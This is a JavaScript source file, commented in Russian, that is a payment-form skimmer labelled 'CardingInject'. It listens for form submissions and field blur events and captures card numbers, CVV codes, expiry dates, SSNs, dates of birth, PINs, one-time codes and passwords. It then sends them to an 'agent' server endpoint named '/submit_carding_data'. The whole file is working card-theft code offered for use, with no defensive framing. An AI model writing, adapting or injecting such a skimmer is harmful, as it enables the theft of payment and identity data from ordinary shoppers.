// JS-инъекция для перехвата форм оплаты (MVP)
(function() {
    // Адрес локального сервера (должен передаваться при инъекции)
    // Пример: будет заменено на `const localServerUrl = "http://localhost:12345";`
    const localServerUrl = "__LOCAL_SERVER_URL__";
    const endpoint = localServerUrl + "/submit_carding_data";

    function getDomain() {
        return window.location.hostname;
    }

    function sendDataToServer(payload) {
        if (localServerUrl === "__LOCAL_SERVER_URL__") {
            console.error("[CardingInject] Local server URL not replaced!");
            return;
        }
        fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).then(response => {
            if (!response.ok) {
                console.error("[CardingInject] Error sending data to local server:", response.status);
            }
        }).catch(error => {
            console.error("[CardingInject] Network error sending data:", error);
        });
    }

    function interceptForm(e) {
        var inputs = e.target.querySelectorAll('input[type="text"], input[type="password"], input[type="number"], input[type="tel"], select, textarea');
        var cardData = {};
        var foundSensitive = false;

        inputs.forEach(function(input) {
            var name = (input.name || input.id || '').toLowerCase();
            var type = input.type.toLowerCase();
            var value = input.value;

            // Расширенный список чувствительных полей
            if (/(card|credit|ccn|ccnum|cc-num)|(cvv|cvc|csc|cid|cc-csc)|(exp|expiry|cc-exp)|(zip|postal)|(ssn)|(dob)|(phone|tel)|(pin)|(otp)|(secret)|(password|pass)/.test(name) || type === 'password') {
                if (value) { // Сохраняем только если есть значение
                    cardData[name || `field_${type}`] = value;
                    foundSensitive = true;
                }
            }
            // Дополнительно проверяем placeholder или aria-label
            var placeholder = (input.placeholder || '').toLowerCase();
            var label = (input.getAttribute('aria-label') || '').toLowerCase();
            if (/(card|credit|ccn|ccnum|cc-num)|(cvv|cvc|csc|cid|cc-csc)|(exp|expiry|cc-exp)|(zip|postal)|(ssn)|(dob)|(phone|tel)|(pin)|(otp)|(secret)|(password|pass)/.test(placeholder + ' ' + label)) {
                 if (value) {
                    cardData[name || `field_${type}_ph`] = value;
                    foundSensitive = true;
                 }
            }
        });

        if (foundSensitive) {
            console.log('[CardingInject] Intercepted form data on:', getDomain(), cardData);
            // Отправить cardData на локальный сервер агента
            const payload = {type: 'carding_form', domain: getDomain(), data: cardData};
            sendDataToServer(payload);
        }
    }

    // Слушаем события submit и blur (для полей, которые могут не быть частью <form>)
    document.addEventListener('submit', interceptForm, true);
    document.addEventListener('blur', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT' || e.target.tagName === 'TEXTAREA') {
            // Создаем псевдо-форму для обработки поля
            var pseudoForm = { target: e.target.form || document }; // Используем форму поля или весь документ
            interceptForm(pseudoForm);
        }
    }, true);

    console.log('[CardingInject] Loaded on', getDomain());
})(); 